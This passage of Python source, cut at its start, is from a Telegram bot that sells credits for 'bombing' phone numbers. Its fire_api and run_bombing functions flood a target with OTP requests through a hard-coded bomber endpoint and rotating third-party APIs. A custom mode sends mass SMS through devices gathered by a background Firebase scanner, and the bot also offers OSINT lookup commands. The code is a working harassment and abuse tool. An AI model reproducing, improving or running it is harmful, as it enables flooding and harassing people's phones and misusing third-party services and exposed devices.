            kb.append([InlineKeyboardButton(f"₹{p['price']} — {p['name'][:10]} ({p['plan_name']})",callback_data=f"pay_view_{pid}")])
        kb.append([InlineKeyboardButton("🔙 Back",callback_data="ap_back")])
        await edit_auto(q,f"📋 <b>PENDING</b> ({len(pending)})",reply_markup=InlineKeyboardMarkup(kb),parse_mode="HTML"); return
    if data.startswith("pay_view_"):
        pid=data.replace("pay_view_","")
        p=db.data.get("pending_payments",{}).get(pid)
        if not p or p.get("status")!="pending":
            await ans("Not found!",show_alert=True); return
        await ans()
        try:
            await q.message.reply_photo(p["screenshot"],
                caption=(f"👤 {html_escape(p['name'])} (@{p['username'] or 'N/A'})\n🆔 <code>{p['user_id']}</code>\n"
                        f"📦 {p['plan_name']}\n💵 ₹{p['price']}\n🎁 {p['credits']}cr\n⏰ {datetime.datetime.fromtimestamp(p['timestamp']).strftime('%Y-%m-%d %H:%M')}"),
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ Approve",callback_data=f"pay_approve_{pid}"),InlineKeyboardButton("❌ Reject",callback_data=f"pay_reject_{pid}")]]),
                parse_mode="HTML")
        except: pass
        return

    # Bomber duration
    if data.startswith("bmb_sel_"):
        dur=data.replace("bmb_sel_",""); opt=DURATION_OPTIONS.get(dur)
        if not opt:
            await ans("Invalid duration!",show_alert=True); return
        phone=context.user_data.get("pending_phone"); mode=context.user_data.get("pending_mode","otp")
        if not phone:
            await ans("Session expired. /bomb again.",show_alert=True); return
        u=db.get_user(user.id)
        if not db.is_free_tier(user.id):
            if u.get("credits",0)<opt["cost"]:
                await ans(f"❌ Need {opt['cost']}. Have {u.get('credits',0)}",show_alert=True); return
            u["credits"]-=opt["cost"]
        u["total_attacks"]=u.get("total_attacks",0)+1; db.save()
        await ans()
        await edit_auto(q,f"⚡ Launching {mode.upper()} on <code>{phone}</code> ({opt['label']})...",parse_mode="HTML")
        # FIX: pass custom_msg as explicit parameter to prevent race condition
        custom_msg = context.user_data.get("custom_msg","") if mode == "custom" else ""
        class FU: pass
        fu=FU(); fu.message=q.message; fu.effective_user=user
        asyncio.create_task(run_bombing(fu,context,user.id,phone,opt,mode,custom_msg))
        context.user_data.pop("pending_phone",None)
        context.user_data.pop("pending_mode",None)
        context.user_data.pop("custom_msg",None)
        return
    if data=="bmb_cancel":
        context.user_data.pop("pending_phone",None); context.user_data.pop("pending_mode",None)
        context.user_data.pop("custom_msg",None)
        await edit_auto(q,"❌ Cancelled."); return

    # OSINT
    if data.startswith("osint_cat_"):
        cat=data.replace("osint_cat_",""); info=OSINT_CATEGORIES.get(cat)
        if not info:
            await ans(); return
        kb=[[InlineKeyboardButton(m,callback_data=f"osint_mod_{c}")] for c,m in info["modules"]]
        kb.append([InlineKeyboardButton("🔙 Back",callback_data="osint_back")])
        await edit_auto(q,f"🔍 <b>{info['title']}</b>",reply_markup=InlineKeyboardMarkup(kb),parse_mode="HTML"); return
    if data.startswith("osint_mod_"):
        cmd=data.replace("osint_mod_","")
        context.user_data["waiting_for"]=f"osint_input_{cmd}"
        await edit_auto(q,f"🎯 <b>{MODULE_NAMES.get(cmd,cmd)}</b>\n\n<b>{OSINT_HINTS.get(cmd,'value')}</b>:",parse_mode="HTML"); return
    if data=="osint_back":
        await edit_auto(q,"🔎 Categories:",reply_markup=osint_matrix_kb(),parse_mode="HTML"); return

    # Admin panel navigation
    if data=="ap_back":
        await edit_auto(q,"🔴 <b>ADMIN PANEL</b>",reply_markup=admin_panel_kb(),parse_mode="HTML"); return
    if data=="ap_credits": await edit_auto(q,"💰 <b>CREDITS</b>",reply_markup=credit_manager_kb(),parse_mode="HTML"); return
    if data=="ap_redeem": await edit_auto(q,"🎟 <b>REDEEM</b>",reply_markup=redeem_manager_kb(),parse_mode="HTML"); return
    if data=="ap_channels": await edit_auto(q,"📢 <b>FORCE JOIN</b>",reply_markup=channels_manager_kb(),parse_mode="HTML"); return
    if data=="ap_firebase": await edit_auto(q,"🔥 <b>FIREBASE</b>",reply_markup=firebase_manager_kb(),parse_mode="HTML"); return
    if data=="ap_apis":
        kb,cur,tot,total=api_manager_kb(0); await edit_auto(q,f"🌐 ({total}) {cur}/{tot}",reply_markup=kb,parse_mode="HTML"); return
    if data=="ap_cmds":
        kb,cur,tot=cmd_settings_kb(0); await edit_auto(q,f"⚙️ {cur}/{tot}",reply_markup=kb,parse_mode="HTML"); return
    if data=="ap_admins": await edit_auto(q,"👑 <b>ADMINS</b>",reply_markup=admins_kb(),parse_mode="HTML"); return
    if data=="ap_users":
        kb,cur,tot,total=users_list_kb(0); await edit_auto(q,f"📋 ({total}) {cur}/{tot}",reply_markup=kb,parse_mode="HTML"); return
    if data=="ap_broadcast":
        context.user_data["waiting_for"]="broadcast_media"; await edit_auto(q,"📡 Send media+caption OR text:"); return
    if data=="ap_banned":
        b=db.data.get("banned_users",[])
        await edit_auto(q,"🚫 "+("\n".join(str(x) for x in b) if b else "None")); return
    if data=="ap_muted":
        m=db.data.get("muted_users",[])
        await edit_auto(q,"🔇 "+("\n".join(str(x) for x in m) if m else "None")); return
    if data=="ap_whitelist": await edit_auto(q,"💎 <b>WHITELIST</b>",reply_markup=whitelist_kb(),parse_mode="HTML"); return
    if data=="ap_protected": await edit_auto(q,"📋 <b>PROTECTED</b>",reply_markup=protected_kb(),parse_mode="HTML"); return
    if data=="ap_lock":
        BOT_LOCKED=not BOT_LOCKED
        await edit_auto(q,f"Bot: {'🔒' if BOT_LOCKED else '🟢'}",reply_markup=admin_panel_kb()); return

    # Credits
    if data=="cred_add_all": context.user_data["waiting_for"]="cred_add_all"; await edit_auto(q,"Amount:"); return
    if data=="cred_ded_all": context.user_data["waiting_for"]="cred_ded_all"; await edit_auto(q,"Amount:"); return
    if data=="cred_add_one": context.user_data["waiting_for"]="cred_add_one_uid"; await edit_auto(q,"UID:"); return
    if data=="cred_ded_one": context.user_data["waiting_for"]="cred_ded_one_uid"; await edit_auto(q,"UID:"); return

    # Redeem
    if data=="red_normal": context.user_data["waiting_for"]="red_normal_amt"; await edit_auto(q,"Credits:"); return
    if data=="red_vip": context.user_data["waiting_for"]="red_vip_days"; await edit_auto(q,"Days:"); return
    if data=="red_list":
        nc=db.data.get("redeem_codes",{}); vc=db.data.get("vip_redeem_codes",{})
        txt="🎁 <b>CODES</b>\n\n"
        for c,d in nc.items():
            if d.get("uses",0)>0: txt+=f"<code>{c}</code> — {d['credits']}cr ({d['uses']})\n"
        for c,d in vc.items():
            if d.get("uses",0)>0: txt+=f"<code>{c}</code> — VIP {d['days']}d\n"
        await edit_auto(q,txt or "None",parse_mode="HTML"); return

    # Channels
    if data=="ch_add": context.user_data["waiting_for"]="ch_add"; await edit_auto(q,"Channel (no @):"); return
    if data.startswith("ch_rem_"):
        ch=data.replace("ch_rem_","")
        if ch in db.data["force_join_channels"]: db.data["force_join_channels"].remove(ch); db.save()
        await edit_auto(q,f"✅ @{ch} removed",reply_markup=channels_manager_kb()); return

    # Firebase
    if data=="fb_add": context.user_data["waiting_for"]="fb_add"; await edit_auto(q,"Firebase URL:"); return
    if data=="fb_bulk": context.user_data["waiting_for"]="fb_bulk"; await edit_auto(q,"Upload .txt:"); return
    if data=="fb_check_all":
        if not fb_manager.fbs: await edit_auto(q,"None."); return
        await edit_auto(q,"🔥 Checking...")
        class FU: pass
        fu=FU(); fu.message=q.message; fu.effective_user=user
        await run_firebase_check(fu,context,[fb["url"] for fb in fb_manager.fbs]); return
    if data=="fb_list":
        txt="🔥 <b>FIREBASES</b>\n\n"
        for fb in fb_manager.fbs[:30]: txt+=f"• {fb['label']}\n  <code>{fb['url']}</code>\n"
        await edit_auto(q,txt or "None",parse_mode="HTML"); return
    if data=="fb_clear":
        fb_manager.fbs=[]; fb_manager.save()
        await edit_auto(q,"✅ Cleared.",reply_markup=firebase_manager_kb()); return

    # API manager
    if data.startswith("api_page_"):
        p=int(data.replace("api_page_","")); kb,cur,tot,total=api_manager_kb(p)
        await edit_auto(q,f"🌐 ({total}) {cur}/{tot}",reply_markup=kb,parse_mode="HTML"); return
    if data.startswith("api_view_"):
        cmd=data.replace("api_view_","")
        custom={}
        if API_CONFIG_FILE.exists():
            try:
                with open(API_CONFIG_FILE,"r",encoding="utf-8") as f: custom=json.load(f)
            except: pass
        url=custom.get(cmd) or DEFAULT_API_MAP.get(cmd,"Not found")
        note="⚙️" if cmd in DEFAULT_API_MAP else "🔧"
        kb=[[InlineKeyboardButton("✏️ Edit",callback_data=f"api_edit_{cmd}")],
            [InlineKeyboardButton("🗑 Reset",callback_data=f"api_del_{cmd}")],
            [InlineKeyboardButton("🔙 Back",callback_data="ap_apis")]]
        await edit_auto(q,f"🌐 <b>/{cmd}</b> {note}\n<code>{html_escape(url)}</code>",reply_markup=InlineKeyboardMarkup(kb),parse_mode="HTML"); return
    if data.startswith("api_edit_"):
        cmd=data.replace("api_edit_",""); context.user_data["waiting_for"]="api_edit_url"; context.user_data["api_edit_target"]=cmd
        await edit_auto(q,f"New URL for /{cmd} (include <code>{{arg}}</code>):",parse_mode="HTML"); return
    if data.startswith("api_del_"):
        cmd=data.replace("api_del_","")
        custom={}
        if API_CONFIG_FILE.exists():
            try:
                with open(API_CONFIG_FILE,"r",encoding="utf-8") as f: custom=json.load(f)
            except: pass
        custom.pop(cmd,None)
        with open(API_CONFIG_FILE,"w",encoding="utf-8") as f: json.dump(custom,f,indent=2)
        await edit_auto(q,f"✅ /{cmd} reset.",reply_markup=api_manager_kb()[0]); return
    if data=="api_add":
        context.user_data["waiting_for"]="api_add_pair"
        await edit_auto(q,"Format: <code>cmd https://url.com/?q={arg}</code>",parse_mode="HTML"); return

    # Cmd settings
    if data.startswith("cmd_page_"):
        p=int(data.replace("cmd_page_","")); kb,cur,tot=cmd_settings_kb(p)
        await edit_auto(q,f"⚙️ {cur}/{tot}",reply_markup=kb,parse_mode="HTML"); return
    if data.startswith("cmd_cfg_"):
        cmd=data.replace("cmd_cfg_",""); await edit_auto(q,f"⚙️ /{cmd}",reply_markup=cmd_cfg_kb(cmd),parse_mode="HTML"); return
    if data.startswith("cmd_toggle_"):
        cmd=data.replace("cmd_toggle_",""); cfg=db.get_cmd_config(cmd)
        cfg["maintenance"]=not cfg.get("maintenance",False); db.save()
        await edit_auto(q,f"✅ /{cmd} maint: {cfg['maintenance']}",reply_markup=cmd_cfg_kb(cmd),parse_mode="HTML"); return
    if data.startswith("cmd_setcost_"):
        cmd=data.replace("cmd_setcost_",""); context.user_data["waiting_for"]="cmd_setcost"; context.user_data["cmd_cfg_target"]=cmd
        await edit_auto(q,f"Cost for /{cmd}:"); return
    if data.startswith("cmd_resetcost_"):
        cmd=data.replace("cmd_resetcost_",""); db.get_cmd_config(cmd)["cost"]=0; db.save()
        await edit_auto(q,"✅ Reset.",reply_markup=cmd_cfg_kb(cmd)); return

    # Admins
    if data=="adm_add":
        if user.id!=MAIN_OWNER:
            await ans("Only owner!",show_alert=True); return
        context.user_data["waiting_for"]="adm_add"; await edit_auto(q,"UID:"); return
    if data.startswith("adm_rem_"):
        if user.id!=MAIN_OWNER:
            await ans("Only owner!",show_alert=True); return
        uid=int(data.replace("adm_rem_",""))
        if uid in db.data["admins"]: db.data["admins"].remove(uid); db.save()
        await edit_auto(q,f"✅ {uid} removed.",reply_markup=admins_kb()); return

    # Users
    if data.startswith("usr_page_"):
        p=int(data.replace("usr_page_","")); kb,cur,tot,total=users_list_kb(p)
        await edit_auto(q,f"📋 {cur}/{tot}",reply_markup=kb,parse_mode="HTML"); return
    if data.startswith("usr_view_"):
        uid=data.replace("usr_view_",""); u=db.data["users"].get(uid,{})
        kb=[[InlineKeyboardButton("➕ Add",callback_data=f"usr_addcr_{uid}"),InlineKeyboardButton("➖ Deduct",callback_data=f"usr_dedcr_{uid}")],
            [InlineKeyboardButton("🚫 Ban",callback_data=f"usr_ban_{uid}")],
            [InlineKeyboardButton("🔙 Back",callback_data="ap_users")]]
        await edit_auto(q,f"👤 <code>{uid}</code>\n{u.get('name','?')}\n💰 {u.get('credits',0)}\n⚔️ {u.get('total_attacks',0)}\n💎 {u.get('premium',False)}",reply_markup=InlineKeyboardMarkup(kb),parse_mode="HTML"); return
    if data.startswith("usr_ban_"):
        uid=int(data.replace("usr_ban_",""))
        if uid in db.data["banned_users"]: db.data["banned_users"].remove(uid)
        else: db.data["banned_users"].append(uid)
        db.save()
        await ans("Toggled",show_alert=True); return
    if data.startswith("usr_addcr_"):
        uid=data.replace("usr_addcr_",""); context.user_data["waiting_for"]="cred_add_one_amt"; context.user_data["credit_uid"]=int(uid)
        await edit_auto(q,f"Add to {uid}:"); return
    if data.startswith("usr_dedcr_"):
        uid=data.replace("usr_dedcr_",""); context.user_data["waiting_for"]="cred_ded_one_amt"; context.user_data["credit_uid"]=int(uid)
        await edit_auto(q,f"Deduct from {uid}:"); return

    # Whitelist
    if data=="wl_add":
        context.user_data["waiting_for"]="wl_add"; await edit_auto(q,"UID:"); return
    if data.startswith("wl_rem_"):
        uid=int(data.replace("wl_rem_",""))
        if uid==MAIN_OWNER:
            await ans("Can't remove owner!",show_alert=True); return
        if uid in db.data["private_whitelist"]: db.data["private_whitelist"].remove(uid); db.save()
        await edit_auto(q,f"✅ {uid} removed.",reply_markup=whitelist_kb()); return

    # Protected
    if data=="prot_add":
        context.user_data["waiting_for"]="prot_add"; await edit_auto(q,"Number:"); return
    if data.startswith("prot_rem_"):
        num=data.replace("prot_rem_","")
        if num in db.data["protected_numbers"]: db.data["protected_numbers"].remove(num); db.save()
        await edit_auto(q,f"✅ {num} unprotected.",reply_markup=protected_kb()); return

    # Catch-all — if nothing matched, answer to prevent loading spinner hang
    await ans()

# ==================== BOMBING ====================
async def fire_api(api,phone):
    try:
        s=await get_http_session()
        method=api.get("method","GET")
        url=api["url"](phone) if callable(api["url"]) else api["url"]
        headers=api.get("headers",{"User-Agent":"Mozilla/5.0"})
        data=api["data"](phone) if callable(api.get("data")) else api.get("data")
        if method=="GET":
            async with s.get(url,headers=headers,timeout=aiohttp.ClientTimeout(total=4)) as r:
                return r.status in [200,201,202]
        else:
            async with s.post(url,headers=headers,data=data,timeout=aiohttp.ClientTimeout(total=4)) as r:
                return 200<=r.status<300
    except: return False

# FIX: custom_msg passed as explicit parameter (race condition fixed)
async def run_bombing(update,context,uid,phone,opt,mode="otp",custom_msg=""):
    dur=opt["sec"]; start=time.time()
    ACTIVE_BOMBINGS[uid]={"stop":False,"target":phone,"sent":0,"start":start,"duration":dur,"mode":mode}
    engine=f"🔥 Firebase ({len(CACHED_DEVICES)})" if mode=="custom" else f"⚡ {len(ONLINE_BOMBER_APIS)} APIs"
    try:
        prog=await update.message.reply_text(f"🚀 <b>BOMBING ({mode.upper()})</b>\n📱 {phone}\n⏳ {opt['label']}\n⚡ {engine}",parse_mode="HTML")
    except: return
    asyncio.create_task(_del_later(prog,dur+120))
    api_idx=0
    try:
        if mode=="custom":
            sem=asyncio.Semaphore(2000)
            async def blast(d):
                async with sem:
                    if await send_device_sms_blast(d,phone,custom_msg): ACTIVE_BOMBINGS[uid]["sent"]+=1
            stop_ev=asyncio.Event()
            async def live():
                while not stop_ev.is_set():
                    try:
                        el=int(time.time()-start); rem=max(0,dur-el)
                        await prog.edit_text(f"🔥 {phone}\n⏱ {el}s/{rem}s\n📬 {ACTIVE_BOMBINGS.get(uid,{}).get('sent',0)}\n📱 {len(CACHED_DEVICES)}",parse_mode="HTML")
                    except: pass
                    await asyncio.sleep(3)
            st=asyncio.create_task(live())
            try:
                while time.time()-start<dur and not ACTIVE_BOMBINGS.get(uid,{}).get("stop"):
                    if not CACHED_DEVICES: await asyncio.sleep(1); continue
                    for i in range(0,len(CACHED_DEVICES),5000):
                        if time.time()-start>=dur or ACTIVE_BOMBINGS.get(uid,{}).get("stop"): break
                        await asyncio.gather(*(blast(d) for d in CACHED_DEVICES[i:i+5000]),return_exceptions=True)
            finally: stop_ev.set(); st.cancel()
        else:
            last_upd=time.time()
            while time.time()-start<dur and not ACTIVE_BOMBINGS.get(uid,{}).get("stop"):
                batch=[fire_api({"url":lambda p: f"https://otp-bomb.noobster11001.workers.dev/?phone={p}","method":"GET"},phone)]
                for _ in range(5):
                    api=ONLINE_BOMBER_APIS[api_idx%len(ONLINE_BOMBER_APIS)]; api_idx+=1
                    if api.get("name")=="Noobster OTP Bomb":
                        api=ONLINE_BOMBER_APIS[api_idx%len(ONLINE_BOMBER_APIS)]; api_idx+=1
                    batch.append(fire_api(api,phone))
                results=await asyncio.gather(*batch,return_exceptions=True)
                ACTIVE_BOMBINGS[uid]["sent"]+=sum(1 for r in results if r is True)
                if time.time()-last_upd>=3:
                    last_upd=time.time(); el=int(time.time()-start); rem=max(0,dur-el)
                    try: await prog.edit_text(f"⚡ {phone}\n⏱ {el}s/{rem}s\n📬 {ACTIVE_BOMBINGS[uid]['sent']}",parse_mode="HTML")
                    except: pass
                await asyncio.sleep(0.1)
    except Exception as e: logger.error(f"Bomb err: {e}")
    total=ACTIVE_BOMBINGS.get(uid,{}).get("sent",0)
    u=db.data["users"].get(str(uid),{})
    if u: u["total_otps"]=u.get("total_otps",0)+total; db.save()
    ACTIVE_BOMBINGS.pop(uid,None)
    try: await prog.edit_text(f"✅ <b>DONE</b>\n📱 {phone}\n⚡ {total}",parse_mode="HTML")
    except: pass

# ==================== BACKGROUND ====================
async def bg_scanner():
    global CACHED_DEVICES
    await asyncio.sleep(10)
    while True:
        try:
            CACHED_DEVICES=await get_all_online_devices()
            logger.info(f"Scan: {len(CACHED_DEVICES)} devices")
        except Exception as e: logger.error(f"Scan: {e}")
        await asyncio.sleep(300)

async def post_init(app): asyncio.create_task(bg_scanner())

async def error_handler(update,context):
    logger.error(f"Err: {context.error}",exc_info=context.error)
    try:
        if update and getattr(update,'effective_message',None):
            await update.effective_message.reply_text("⚠️ Error.")
    except: pass

# ==================== MAIN ====================
from aiohttp import web
from telegram import Update
import asyncio

async def main():
    print("="*60)
    print(f"🚀 {BRAND_NAME} BOT v9.1 — FULLY FIXED")
    print(f"👑 @{OWNER_USERNAME} | 📢 @{OFFICIAL_GROUP}")
    print(f"🔗 {WEBHOOK_URL or '❌ NOT SET'}")
    print(f"🌐 Port: {PORT} | 💣 {len(ONLINE_BOMBER_APIS)} APIs | 🔍 {len(DEFAULT_API_MAP)} OSINT APIs")
    print("="*60)
    if not WEBHOOK_URL:
        print("\n❌ WEBHOOK_URL missing in config.json!")
        sys.exit(1)
        
    app=(Application.builder().token(BOT_TOKEN).post_init(post_init)
        .concurrent_updates(256).read_timeout(30).write_timeout(30)
        .connect_timeout(15).pool_timeout(10).build())
        
    app.add_error_handler(error_handler)
    
    # Saare handlers
    app.add_handler(CommandHandler("start",cmd_start))
    app.add_handler(CommandHandler("help",cmd_help))
    app.add_handler(CommandHandler("panel",cmd_panel))
    app.add_handler(CommandHandler("plans",cmd_plans))
    app.add_handler(CommandHandler("buy",cmd_buy))
    app.add_handler(CommandHandler("cancel",cmd_cancel))
    app.add_handler(CommandHandler("bomb",cmd_bomb))
    app.add_handler(CommandHandler("custombomb",cmd_custombomb))
    app.add_handler(CommandHandler("stop",cmd_stop))
    app.add_handler(CommandHandler("credits",cmd_credits))
    app.add_handler(CommandHandler("stats",cmd_stats))
    app.add_handler(CommandHandler("spin",cmd_spin))
    app.add_handler(CommandHandler("redeem",cmd_redeem))
    app.add_handler(CommandHandler("referral",cmd_referral))
    app.add_handler(CommandHandler("premium",cmd_premium))
    app.add_handler(CommandHandler("mute",cmd_mute))
    app.add_handler(CommandHandler("unmute",cmd_unmute))
    app.add_handler(CommandHandler("ban",cmd_ban))
    app.add_handler(CommandHandler("unban",cmd_unban))
    for c in OSINT_HINTS.keys():
        app.add_handler(CommandHandler(c, cmd_osint))
    app.add_handler(CallbackQueryHandler(callback_router))
    app.add_handler(MessageHandler(filters.Document.ALL|filters.PHOTO|filters.VIDEO|filters.AUDIO|filters.Sticker.ALL|filters.VOICE|filters.ANIMATION,unified_media))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND,unified_text))

    # ================= HEALTH CHECK & WEBHOOK SETUP =================
    async def health_check(request):
        return web.Response(text="OK - Bot is Alive", status=200)

    async def telegram_webhook(request):
        try:
            data = await request.json()
            update = Update.de_json(data, app.bot)
            await app.update_queue.put(update)
            return web.Response(status=200)
        except Exception as e:
            logger.error(f"Webhook error: {e}")
            return web.Response(status=400)

    aio_app = web.Application()
    aio_app.router.add_get("/health", health_check)
    aio_app.router.add_get("/", health_check)
    aio_app.router.add_post(f"/{BOT_TOKEN}", telegram_webhook)

    runner = web.AppRunner(aio_app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()

    await app.initialize()
    await app.start()
    
    await app.bot.set_webhook(
        url=f"{WEBHOOK_URL}/{BOT_TOKEN}",
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES
    )
    
    print(f"✅ WEBHOOK LIVE on 0.0.0.0:{PORT}")
    print(f"✅ Health check active at {WEBHOOK_URL}/health")
    
    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        pass
    finally:
        await app.stop()
        await app.shutdown()
        await runner.cleanup()

# ==================== START BOT ====================
if __name__ == "__main__":
    asyncio.run(main())